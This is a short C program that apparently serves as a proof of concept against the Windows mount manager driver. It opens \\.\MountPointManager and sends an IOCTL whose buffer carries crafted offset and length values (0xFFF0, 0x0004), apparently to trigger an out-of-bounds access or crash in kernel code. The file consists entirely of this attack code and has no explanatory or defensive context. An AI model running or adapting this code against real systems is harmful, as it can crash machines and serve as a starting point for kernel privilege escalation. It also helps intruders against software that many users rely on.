#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#ifndef FILE_DEVICE_MOUNTMGR
#define FILE_DEVICE_MOUNTMGR 0x0000006d
#endif
#define IOCTL_MGR_CREATE                                                       \
  CTL_CODE(FILE_DEVICE_MOUNTMGR, 0x0, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main(void) {
  HANDLE h =
      CreateFileW(L"\\\\.\\MountPointManager", GENERIC_READ | GENERIC_WRITE, 0,
                  0, OPEN_EXISTING, 0, 0);
  if (h == INVALID_HANDLE_VALUE) {
    printf("[-] CreateFile err = %lu  (run CMD *not* double-click)\n",
           GetLastError());
    getchar();
    return 1;
  }

  BYTE buf[0x1000] = {0};
  WORD *w = (WORD *)buf;
  w[0] = 0xFFF0;
  w[1] = 0x0004;
  w[2] = 0xFFF0;
  w[3] = 0x0004;

  DWORD ios = 0;
  BOOL ok = DeviceIoControl(h, IOCTL_MGR_CREATE, buf, sizeof(buf), NULL, 0,
                            &ios, NULL);

  printf("[+] DeviceIoControl ok=%d  WinErr=%lu  IoStatus=%u\n", ok,
         GetLastError(), ios);
  getchar();
  return 0;
}
